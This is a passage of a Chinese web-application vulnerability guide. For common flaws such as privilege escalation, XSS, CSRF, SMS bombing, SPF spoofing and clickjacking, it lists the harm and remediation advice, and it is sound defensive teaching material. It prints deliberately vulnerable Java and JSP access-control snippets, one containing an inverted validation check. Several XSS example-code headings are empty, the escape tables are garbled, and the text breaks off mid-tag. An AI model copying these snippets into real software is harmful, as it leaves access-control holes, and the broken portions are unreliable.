title="修改反回包逻辑漏洞"></a>修改反回包逻辑漏洞</h3><p><strong>漏洞危害：</strong></p><p>由于对登录的账号及口令校验存在逻辑缺陷，或再次使用服务器端返回的相关参数作为最终登录凭证，导致可绕过登录限制，如服务器返回一个flag参数作为登录是否成功的标准，但是由于代码最后登录是否成功是通过获取这个flag参数来作为最终的验证，导致攻击者通过修改flag参数即可绕过登录的限制！</p><p><strong>修复建议</strong></p><p> 修改验证逻辑，如是否登录成功服务器端返回一个参数，但是到此就是最终验证，不需要再对返回的参数进行使用并作为登录是否成功的最终判断依据！</p><h3 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h3><p><strong>漏洞危害：</strong></p><p> 恶意利用可获取大量用户名密码信息，结合社工库将造成巨大危害。</p><p><strong>修复建议：</strong></p><p>撞库漏洞是非常普遍的安全漏洞，结合社工库撞库可获取大量用户名密码。解决方法一般有两种：</p><p>1）在登录处加入安全的图片验证码，增加撞库的难度。 安全的图片验证码必须满足：</p><p>生成过程安全：图片验证码必须在服务器端进行产生与校验；</p><p>使用过程安全：单次有效，且以用户的验证请求为准；</p><p>验证码自身安全：不易被识别工具识别，能有效防止暴力破解。</p><p>2）在服务器端进行登录限制，针对同一ip的登陆验证加以限制。使用了图片验证码后，能防止攻击者有效进行“动态短信”功能的自动化调用；但若攻击者忽略图片验证码验证错误的情况，大量执行请求会给服务器带来额外负担，影响业务使用。建议在服务器端限制单个 IP 在单位时间内的请求次数，一旦用户请求次数（包括失败请求次数）超出设定的阈值，则暂停对该 IP一段时间的请求；若情节特别严重，可以将 IP 加入黑名单，禁止该 IP 的访问请求。该措施能限制一个 IP 地址的大量请求，避免攻击者通过同一个 IP 对大量用户进行攻击，增加了攻击难度，保障了业务的正常开展。该阈值设定可依据业务的不同执行设定，一般情况下建议不超过 200 个/分钟。</p><h3 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h3><p><strong>漏洞危害：</strong></p><p> 恶意利用将严重消耗服务器及带宽资源</p><p><strong>修复建议：</strong></p><p>短信轰炸形成的原因是因为非授权的动态短信获取，而由于业务的需要，在使用动态短信业务前系统并不能建立业务关联。因此，在未建立业务关联的情况下，需要进一步严格限制保证业务使用的安全性。针对短信炸弹问题，建议综合采用：增加图片验证码、单IP 请求次数限制、限制发送时长限制 3 个措施， 防护“动态短信获取” 功能与业务接口。</p><p>措施一：使用安全的图片验证码</p><p>恶意攻击者采用自动化工具，调用“动态短信获取”接口进行动态短信发送，</p><p>究其原因是攻击者可以自动对接口进行大量调用。采用图片验证码可有效防止工具自动化调用，即当用户进行“获取动态短信”操作前，弹出图片验证码，要求用户输入验证码后，服务器端再发送动态短信到用户手机上，该方法可有效解决被利用实施炸弹攻击的问题。</p><p>安全的图片验证码必须满足：</p><p>生成过程安全：图片验证码必须在服务器端进行产生与校验；</p><p>使用过程安全：单次有效，且以用户的验证请求为准；</p><p>验证码自身安全：不易被识别工具识别，能有效防止暴力破解。</p><p>措施二：单 IP 的请求次数限定</p><p>使用了图片验证码后，能防止攻击者有效进行“动态短信”功能的自动化调</p><p>用；但若攻击者忽略图片验证码验证错误的情况，大量执行请求会给服务器带来</p><p>额外负担，影响业务使用。建议在服务器端限制单个 IP 在单位时间内的请求次</p><p>数，一旦用户请求次数（包括失败请求次数）超出设定的阈值，则暂停对该 IP</p><p>一段时间的请求；若情节特别严重，可以将 IP 加入黑名单，禁止该 IP 的访问请求。该措施能限制一个 IP 地址的大量请求，避免攻击者通过同一个 IP 对大量用户进行攻击，增加了攻击难度，保障了业务的正常开展。</p><p>该阈值设定可依据业务的不同执行设定，一般情况下建议不超过 200 个/分</p><p>钟。</p><p>措施三：单用户动态短信请求间隔时长限制</p><p>为进一步优化业务正常使用，建议采用限制重复发送动态短信的间隔时长，</p><p>即当单个用户请求发送一次动态短信之后，服务器端锁定如： 30 秒后，才能进</p><p>行第二次动态短信请求。该功能可进一步保障用户体验，并避免包含手工攻击恶</p><p>意发送垃圾验证短信。</p><h3 id="邮件轰炸"><a href="#邮件轰炸" class="headerlink" title="邮件轰炸"></a>邮件轰炸</h3><p><strong>漏洞危害：</strong></p><p>恶意利用将严重消耗服务器及带宽资源，并对邮箱用户造成困扰。</p><p><strong>修复建议：</strong></p><p> 此漏洞是非常普遍的安全问题，通常是由于服务端对验证码发送未做限制或限制不完善导致。解决方法一般是：</p><p>措施一：使用安全的图片验证码</p><p>采用图片验证码可有效防止工具自动化调用，即当用户进行 “获取动态短信”操作前，弹出图片验证码，要求用户输入验证码后，服务器端再发送动态短信到用户手机上，该方法可有效解决被利用实施炸弹攻击的问题。</p><p>安全的图片验证码必须满足：</p><p>生成过程安全：图片验证码必须在服务器端进行产生与校验；</p><p>使用过程安全：单次有效，且以用户的验证请求为准；</p><p>验证码自身安全：不易被识别工具识别，能有效防止暴力破解。</p><p>措施二：单 IP 的请求次数限定</p><p>建议在服务器端限制单个 IP 在单位时间内的请求次</p><p>数，一旦用户请求次数（包括失败请求次数）超出设定的阈值，则暂停对该 IP</p><p>一段时间的请求；若情节特别严重，可以将 IP 加入黑名单，禁止该 IP 的访问请求。该措施能限制一个 IP 地址的大量请求，避免攻击者通过同一个 IP 对大量用户进行攻击，增加了攻击难度，保障了业务的正常开展。</p><p>该阈值设定可依据业务的不同执行设定，一般情况下建议不超过 200 个/分</p><p>钟。</p><h3 id="密码重置（爆破验证码）"><a href="#密码重置（爆破验证码）" class="headerlink" title="密码重置（爆破验证码）"></a>密码重置（爆破验证码）</h3><p><strong>漏洞危害：</strong></p><p>恶意利用可导致任意用户密码重置，严重影响其他用户正常使用</p><p> <strong>修复建议：</strong></p><p>此漏洞是由于验证码处未做限制，导致可爆破出有效验证码。解决方法一般有两种：</p><p>1）在登录处加入安全的图片验证码，增加撞库的难度。 安全的图片验证码必须满足：</p><p>生成过程安全：图片验证码必须在服务器端进行产生与校验；</p><p>使用过程安全：单次有效，且以用户的验证请求为准；</p><p>验证码自身安全：不易被识别工具识别，能有效防止暴力破解。</p><p>2）在服务器端进行登录限制，针对同一ip的登陆验证加以限制。使用了图片验证码后，能防止攻击者有效进行“动态短信”功能的自动化调用；但若攻击者忽略图片验证码验证错误的情况，大量执行请求会给服务器带来额外负担，影响业务使用。建议在服务器端限制单个 IP 在单位时间内的请求次数，一旦用户请求次数（包括失败请求次数）超出设定的阈值，则暂停对该 IP一段时间的请求；若情节特别严重，可以将 IP 加入黑名单，禁止该 IP 的访问请求。该措施能限制一个 IP 地址的大量请求，避免攻击者通过同一个 IP 对大量用户进行攻击，增加了攻击难度，保障了业务的正常开展。该阈值设定可依据业务的不同执行设定，一般情况下建议不超过 200 个/分钟。交易金额篡改</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p><strong>漏洞危害：</strong></p><p> 垂直越权分为向上垂直越权与向下垂直越权。向上垂直越权及普通用户即可获得管理员权限，由于web应用程序没有做权限控制，或仅仅在菜单上做了权限控制，导致的恶意用户只要猜测其他管理页面的URL，就可以访问或控制其他角色拥有的数据或页面，达到权限提升目的；向下水平越权即为管理员拥有用户权限，可对用户平台进行操作，也就是说一旦存在向下水平越权，全部用户信息都将沦陷。</p><p>代码案例：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;tr&gt;&lt;td&gt;&lt;ahref=&quot;/user.jsp&quot;&gt;管理个人信息&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;%if(power.indexOf(&quot;administrators&quot;)&gt;-1)&#123;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;tr&gt;&lt;td&gt;&lt;ahref=&quot;/userlist.jsp&quot;&gt;管理所有用户&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;%&#125;%</span><br></pre></td></tr></table></figure><p>代码仅仅对用户跳转到那个页面进行了判断，并没有对用户跳转后的页面判断此用户是否有权限登陆此页面</p><p><strong>修复建议：</strong></p><p>在配置权限时，应当使用“最小权限原则”，并使用”默认拒绝“的策略，只对有需要的主题单独配置”允许”的策略;如果管理员与普通用户表是同一张数据表，就必须要存在权限证明字段，在打开管理页面时，首先判断当前用户是否拥有该页面的权限，如果没有权限，就判定为越权攻击，同时记录安全日志.同时建议使用成熟的权限框架处理问题如:spring security</p><p>代码案例</p><p>例如：Spring Security使用配置文件对URL的用户进行设定：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;sec:http&gt;</span><br><span class="line"></span><br><span class="line">   &lt;sec:intercept-url pattern=&quot;/manager_portal.do**&quot;access=&quot;MANAGER_USER&quot;/&gt;</span><br><span class="line"></span><br><span class="line">   &lt;sec:intercept-url pattern=&quot;/**&quot;access=&quot;NORMAL_USER&quot;/&gt;</span><br><span class="line"></span><br><span class="line">   &lt;sec:form-login/&gt;</span><br><span class="line"></span><br><span class="line">   &lt;sec:logout/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/sec:http&gt;</span><br></pre></td></tr></table></figure><p>或者做一个Filter,当用户登录后，就把此用户的信息放到Session中，当访问设定路径时，通过函数判断，是否有权访问次路径。Filter配置如下：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line"></span><br><span class="line">   &lt;filter-name&gt;checkadmin&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">   &lt;filter-class&gt;com.xxser.filter.checkadmin&lt;/filter-class&gt;</span><br><span class="line"></span><br><span class="line">&lt;/filter&gt;</span><br><span class="line"></span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">   &lt;filter-name&gt;checkadmin&lt;/filter-name&gt;</span><br><span class="line"></span><br><span class="line">   &lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;filter-mapping&gt;</span><br></pre></td></tr></table></figure><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p><strong>漏洞危害：</strong></p><p>web应用程序接受到用户请求，没有判断数据所属人；或判断数据所属人，从用户提交到request参数中，并获取了数据所属人的参数,修改参数内容导致恶意攻击者，可对其他用户账户的信息进行非法操作，例如查看，删除，修改，增加他人账户的私人信息。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">代码案例：</span><br><span class="line"></span><br><span class="line">public String  execute()&#123;</span><br><span class="line"></span><br><span class="line">int id =Integer.parseInt(request.getParameter(&quot;userId&quot;));</span><br><span class="line"></span><br><span class="line">String password = request.getParameter(&quot;password&quot;);</span><br><span class="line"></span><br><span class="line">String password2 = request.getParameter(&quot;password2&quot;);</span><br><span class="line"></span><br><span class="line">if(!(&quot;&quot;.equals(password)||&quot;&quot;.equals(password2)))&#123;</span><br><span class="line"></span><br><span class="line">return ERROR;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!password.equals(password2))&#123;</span><br><span class="line"></span><br><span class="line">return ERROR;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">User u = new UserBiz().findUserById(id);  //根据ID来获取User具体对象</span><br><span class="line"></span><br><span class="line">u.setPassword(password);</span><br><span class="line"></span><br><span class="line">boolean flag = new UserBiz().saveOrUpate(u);//更新对象</span><br><span class="line"></span><br><span class="line">if(flag)&#123;</span><br><span class="line"></span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;else &#123;</span><br><span class="line"></span><br><span class="line">return ERROR;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>修复建议：</strong></p><p>从用户的加密认证cookie中，获取当前用户的id，并且需要在执行的SQL语句中，加入当前用户id作为条件语句。由于是web应用控制的加密算法，所以恶意用户无法修改加密信息，验证一切来自客户端的参数，重点是和权限相关的参数，比如用户ID或者角色权限ID等。sessionID 和认证的token做绑定，放在服务器的会话里，不发送给客户端。对于用户登录后涉及用户唯一信息的请求，每次都要验证检查所有权，敏感信息页面加随机数的参数，防止浏览器缓存内容。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">代码案例：</span><br><span class="line"></span><br><span class="line">public String  execute()&#123;</span><br><span class="line"></span><br><span class="line">int id =Integer.parseInt(request.getParameter(&quot;userId&quot;));</span><br><span class="line"></span><br><span class="line">String oldpass = request.getParameter(&quot;oldpass&quot;);</span><br><span class="line"></span><br><span class="line">User  u  = new UserBiz().findUserById(id);          //根据ID查找用户</span><br><span class="line"></span><br><span class="line">if(!(u.getPassword().equals(oldpass)))&#123;             //比较原密码是否相同</span><br><span class="line"></span><br><span class="line">return &quot;-1&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String password = request.getParameter(&quot;password&quot;);</span><br><span class="line"></span><br><span class="line">String password2 = request.getParameter(&quot;password2&quot;);</span><br><span class="line"></span><br><span class="line">if(!(&quot;&quot;.equals(password)||&quot;&quot;.equals(password2)))&#123;</span><br><span class="line"></span><br><span class="line">return &quot;0&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!password.equals(password2))&#123;</span><br><span class="line"></span><br><span class="line">return &quot;0&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u.setPassword(password);</span><br><span class="line"></span><br><span class="line">boolean flag = new UserBiz().saveOrUpate(u);    //保存或者更新User对象</span><br><span class="line"></span><br><span class="line">if(flag)&#123;</span><br><span class="line"></span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;else &#123;</span><br><span class="line"></span><br><span class="line">return ERROR;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p><strong>漏洞危害：</strong></p><p> 跨站脚本攻击（XSS）是一种注入型漏洞，插入恶意脚本到那些受信任的网站中的HTML页面内。服务器端如果没有在适当的验证和转义的情况下，就将它发送给一个网页浏览器，这样就会产生跨站点脚本攻击。XSS允许攻击者在受害者的浏览器上执行脚本，从而劫持用户会话，钓鱼，控制用户浏览器，或者将用户转向至恶意网站，甚至蠕虫攻击等。</p><p>XSS通常细分为三种分类：</p><ul><li><p>反射型跨站脚本攻击</p></li><li><ul><li>攻击者会通过社会工程学手段，发送一个URL连接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。</li></ul></li><li><p>存储型跨站脚本攻击</p></li><li><ul><li>攻击者利用web应用程序提供的录入或修改数据功能，将数据存储到服务器或用户cookie中，当其他用户浏览展示该数据的页面时，浏览器会执行页面中嵌入的恶意脚本。所有浏览者都会受到攻击。</li></ul></li><li><p>DOM跨站脚本攻击</p></li><li><ul><li>由于html页面中，定义了一段JS，根据用户的输入，显示一段html代码，攻击者可以在输入时，插入一段恶意脚本，最终展示时，会执行恶意脚本。</li><li>DOM跨站和以上两个跨站攻击的差别是，DOM跨站是纯页面脚本的输出，只有规范使用JAVASCRIPT，才可以防御。</li></ul></li></ul><p><strong>修复建议：</strong></p><p>以下列出的修复建议是针对于不同的场景：</p><p>HTML/XML页面输出规范：</p><ol><li>在HTML标签中显示“用户可控数据”前，应该进行html escape转义。下表为需要转义的字符：</li></ol><table><thead><tr><th>元字符</th><th>转义后的字符</th></tr></thead><tbody><tr><td>&amp;</td><td>&amp;</td></tr><tr><td>&lt;</td><td>&lt;</td></tr><tr><td>&gt;</td><td>&gt;</td></tr><tr><td>“</td><td>&quot;</td></tr><tr><td>‘</td><td>&#x27;</td></tr><tr><td>/</td><td>&#x2F;</td></tr></tbody></table><p>Java转义方法示例：</p><p>.Net转义方法示例：</p><ol><li>在HTML通用属性中显示“用户可控数据”前，需防止用户数据逃溢出HTML的属性边界。对小于256的ASCII值，需要做html实体编码，格式为&#xHH;</li><li>在JavaScript内容中输出“用户可控数据”，需要做JavaScript Escape转义。</li></ol><p>Java示例代码：</p><p>.Net示例代码：</p><p>需要转义的字符包括：</p><table><thead><tr><th>元字符</th><th>转义后的字符</th></tr></thead><tbody><tr><td>/</td><td>/</td></tr><tr><td>‘</td><td>\’</td></tr><tr><td>“</td><td>\”</td></tr><tr><td>\</td><td>\</td></tr></tbody></table><ol><li>在CSS style内容中输出的“用户可控数据”，需要做CSS Escape转义和严格验证。把除了字母、数字外的所有字符都需要被编码成十六进制，形式为“\uHH”。</li><li>在URL中输出的“用户可控数据”，需要做URL安全编码。可使用URLEncode，将字符转换成“%HH”的格式。</li></ol><p>Java示例代码：</p><p>.Net示例代码：</p><ol><li>在XML中输出“用户可控数据”时，对数据部分做HTML转义。</li></ol><p>示例代码：</p><ol><li>JSON输出需要对变量内容中的“用户可控数据”单独做HTMLEscape，在对变量做一次JavascriptEscape。</li></ol><p>Java示例代码：</p><p>.Net示例代码：</p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p><strong>漏洞危害：</strong></p><p> CSRF（Cross-Site Request Forgery，跨站点伪造请求），长期活跃在OWASP（提供有关互联网应用程序安全信息的权威性、非盈利组织） TOP10排行榜上，是常见的一种攻击手法。其攻击本质可以用一句话概括：攻击者B在受害者A不知情的情况下，利用其合法身份，向服务器C发送恶意请求，达到其非法目的。这种非法目的一般有以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账等，造成的问题包括：个人隐私泄露以及财产安全。恶意利用将导致用户执行用户未知的危险操作。</p><p><strong>修复建议：</strong></p><p> 防止CSRF攻击有多种手段，一种是判断发起请求的源站是否是可信站点，另一种就是在请求中加入第三方无法预测到的数值，这两种方式都可以通过在服务器写一个拦截器去实现。</p><p>1.验证HTTPReferer字段</p><p>在HTTP头中有个字段为Referer，它记录了该HTTP请求的源地址。<br>Referer值由浏览器提供，我们可以通过在服务器侧判断Referer值是否为可信的来判断CSRF攻击。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 从 HTTP 头中取得 Referer 值</span><br><span class="line"></span><br><span class="line"> Stringreferer=request.getHeader(&quot;Referer&quot;); </span><br><span class="line"></span><br><span class="line">// 判断 Referer 是否以 bank.example 开头</span><br><span class="line"></span><br><span class="line"> if((referer!=null)&amp;&amp;(referer.trim().startsWith(&quot;bank.example&quot;)))&#123; </span><br><span class="line"></span><br><span class="line">    chain.doFilter(request, response); </span><br><span class="line"></span><br><span class="line"> &#125;else&#123;</span><br><span class="line"></span><br><span class="line">//如果不是则跳转到error页面或404 </span><br><span class="line"></span><br><span class="line">   request.getRequestDispatcher(&quot;error.jsp&quot;).forward(request,response);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>2.添加CSRFtoken验证</p><p>我们可以通过java.util.UUID生成随机token，再将token放入session中，每次请求时把token从session中拿出来与请求中的token进行比对。<br>通常接收token值有几种方式，其一是GET请求中我们可以将token值放入请求参数中，在POST请求中我们可以将它加入HTTP header或者form表单中。<br>如果两个token有差异那么就可能是恶意攻击。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">HttpServletRequest req =(HttpServletRequest)request; </span><br><span class="line"></span><br><span class="line"> HttpSession s = req.getSession(); </span><br><span class="line"></span><br><span class="line"> // 从 session 中得到 csrftoken 属性</span><br><span class="line"></span><br><span class="line"> String sToken =(String)s.getAttribute(&quot;csrftoken&quot;); </span><br><span class="line"></span><br><span class="line"> if(sToken == null)&#123; </span><br><span class="line"></span><br><span class="line">    // 产生新的 token 放入 session 中</span><br><span class="line"></span><br><span class="line">    sToken = UUID.randomUUID().toString(); </span><br><span class="line"></span><br><span class="line">   s.setAttribute(&quot;csrftoken&quot;,sToken); </span><br><span class="line"></span><br><span class="line">    chain.doFilter(request, response); </span><br><span class="line"></span><br><span class="line"> &#125; else&#123; </span><br><span class="line"></span><br><span class="line">    // 从 HTTP 头中取得 csrftoken </span><br><span class="line"></span><br><span class="line">    String xhrToken =req.getHeader(&quot;csrftoken&quot;); </span><br><span class="line"></span><br><span class="line">    // 从请求参数中取得csrftoken </span><br><span class="line"></span><br><span class="line">    String pToken =req.getParameter(&quot;csrftoken&quot;); </span><br><span class="line"></span><br><span class="line">    if(sToken != null &amp;&amp; xhrToken !=null &amp;&amp; sToken.equals(xhrToken))&#123; </span><br><span class="line"></span><br><span class="line">        chain.doFilter(request, response); </span><br><span class="line"></span><br><span class="line">    &#125;else if(sToken != null &amp;&amp; pToken!= null &amp;&amp; sToken.equals(pToken))&#123; </span><br><span class="line"></span><br><span class="line">        chain.doFilter(request, response); </span><br><span class="line"></span><br><span class="line">    &#125;else&#123; </span><br><span class="line"></span><br><span class="line">       request.getRequestDispatcher(&quot;error.jsp&quot;).forward(request,response);</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p><strong>漏洞危害：</strong></p><p> 恶意利用将导致未授权用户使用高权限登录重要业务系统</p><p><strong>修复建议：</strong></p><p>弱口令是非常普遍的安全漏洞。主要是由于管理人员和员工日常运维管理的疏忽，可导致业务系统被他人非法进入。解决方法一般是强制配置密码复杂度，要求定期更换密码，并对相关人员进行培训。</p><h3 id="CORS-漏洞"><a href="#CORS-漏洞" class="headerlink" title="CORS 漏洞"></a>CORS 漏洞</h3><p><strong>漏洞危害：</strong></p><p>1、HTTP头只能说明请求来自一个特定的域，但是并不能保证这个事实。因为HTTP头可以被伪造。</p><p>2、第三方有可能被入侵</p><p>3、恶意跨域请求</p><p>即便页面只允许来自某个信任网站的请求，但是它也会收到大量来自其他域的跨域请求。.这些请求有时可能会被用于执行应用层面的DDOS攻击，并不应该被应用来处理。</p><p>4、内部信息泄漏</p><p>假定一个内部站点开启了CORS，如果内部网络的用户访问了恶意网站，恶意网站可以通过CORS（跨域请求）来获取到内部站点的内容。</p><p><strong>修复建议：</strong></p><p>1、不信任未经身份验证的跨域请求，应该首先验证SessionID或者Cookie。</p><p>2、对于请求方来说验证接收的数据有效性，服务方仅暴露最少最必须的功能。</p><p>3、通过多种条件屏蔽掉非法的请求，例如HTTP头、参数等。</p><h3 id="邮箱伪造SPF"><a href="#邮箱伪造SPF" class="headerlink" title="邮箱伪造SPF"></a>邮箱伪造SPF</h3><p><strong>漏洞危害：</strong></p><p>恶意利用将导致伪造任意邮箱发送邮件，结合社工造成严重危害。</p><p><strong>修复建议：</strong></p><p>域名信息里spf如果没有设置，就可以伪造发件人，邮件服务器是根据域名信息里的spf来判断邮件的合法性。</p><p>下面命令查询spf记录</p><p>nslookup -type=txt</p><p>此漏洞是由于邮件服务器未添加SPF记录，导致可任意搭建邮件服务器。解决方法一般是在DNS中添加TXT记录，以增加SPF记录。</p><p>SPF 记录的语法</p><p>一条 SPF 记录定义了一个或者多个 mechanism，而 mechanism 则定义了哪些 IP 是允许的，哪些 IP 是拒绝的。</p><p>这些 mechanism 包括以下几类：</p><p>all | ip4 | ip6 | a | mx | ptr | exists |include</p><p>每个 mechanism 可以有四种前缀：</p><p>“+”  Pass（通过）</p><p>“-“  Fail（拒绝）</p><p>“~”  Soft Fail（软拒绝）</p><p>“?”  Neutral（中立）</p><h3 id="配置不当异常信息泄露"><a href="#配置不当异常信息泄露" class="headerlink" title="配置不当异常信息泄露"></a>配置不当异常信息泄露</h3><p><strong>漏洞危害：</strong></p><p> 由于配置或代码问题导致的报错，会返回一些异常信息，从而暴露很多敏感的信息。检测到服务器返回状态如果为500或者404等错误页面时，请求响应内容的信息中包含服务器版本信息，攻击者可能通过获取该信息，根据该版本已公布的漏洞信息，进行针对性利用，增加了web应用被攻击的风险。</p><p><strong>修复建议：</strong></p><p>1、配置错误页面，让所有的错误都只显示友好信息，不显示任何与实际错误相关的信息。</p><p>2、隐藏服务器版本信息。 </p><p>3、在WAF设置服务器信息泄漏防护。</p><h3 id="网站使用HTTP（未使用https）"><a href="#网站使用HTTP（未使用https）" class="headerlink" title="网站使用HTTP（未使用https）"></a>网站使用HTTP（未使用https）</h3><p><strong>漏洞危害：</strong></p><p>攻击者可利用中间人攻击获取连接当中的明文内容，对用户账号及敏感信息造成巨大威胁。</p><p><strong>修复建议：</strong></p><p>1、建议使用https，为浏览器和服务器之间的通信加密。</p><h3 id="点击劫持漏洞"><a href="#点击劫持漏洞" class="headerlink" title="点击劫持漏洞"></a>点击劫持漏洞</h3><p><strong>漏洞危害：</strong></p><p>点击劫持（ClickJacking）是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。  </p><p>HTTP 响应头信息中的X-Frame-Options，可以指示浏览器是否应该加载一个 iframe 中的页面。如果服务器响应头信息中没有X-Frame-Options，则该网站存在ClickJacking攻击风险。网站可以通过设置 X-</p><p>Frame-Options 阻止站点内的页面被其他页面嵌入从而防止点击劫持。</p><p><strong>修复建议：</strong></p><p>修改web服务器配置，添加X-Frame-Options响应头。赋值有如下三种：  </p><p>1、DENY：不能被嵌入到任何iframe或者frame中。  </p><p>2、SAMEORIGIN:页面只能被本站页面嵌入到iframe或者frame中。  </p><p>3、ALLOW-FROMuri：只能被嵌入到指定域名的框架中。  </p><p>例如：  </p><p>apache可配置http.conf如下： </p><ifmoduleheaders_module> 